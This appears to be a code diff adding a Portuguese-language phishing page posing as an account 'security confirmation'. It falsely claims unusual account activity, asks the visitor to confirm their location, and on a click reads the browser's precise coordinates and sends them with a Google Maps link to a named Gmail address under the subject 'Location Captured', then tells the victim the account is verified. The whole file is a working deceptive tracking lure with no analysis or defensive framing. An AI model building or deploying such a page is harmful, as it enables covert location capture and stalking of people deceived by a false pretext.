@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmação de Segurança</title>
+</head>
+<body style="text-align: center; font-family: Arial, sans-serif; padding: 20px;">
+    <h2>Confirmação de Segurança</h2>
+    <p>Detectamos uma atividade incomum na sua conta. Para continuar, confirme sua localização.</p>
+    <button onclick="getLocation()" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">Confirmar Localização</button>
+
+    <script>
+        function sendEmail(latitude, longitude) {
+            const email = "kiwifyheitormedeiros@gmail.com";
+            const subject = "📍 Localização Capturada";
+            const body = `Latitude: ${latitude}%0D%0ALongitude: ${longitude}%0D%0AGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            window.location.href = `mailto:${email}?subject=${subject}&body=${body}`;
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        sendEmail(latitude, longitude);
+                        document.body.innerHTML = "<h2 style='text-align:center;'>Obrigado! Sua conta foi verificada.</h2>";
+                    },
+                    error => {
+                        alert("Erro ao obter localização: " + error.message);
+                    }
+                );
+            } else {
+                alert("Seu navegador não suporta geolocalização.");
+            }
+        }
+    </script>
+</body>
+</html>
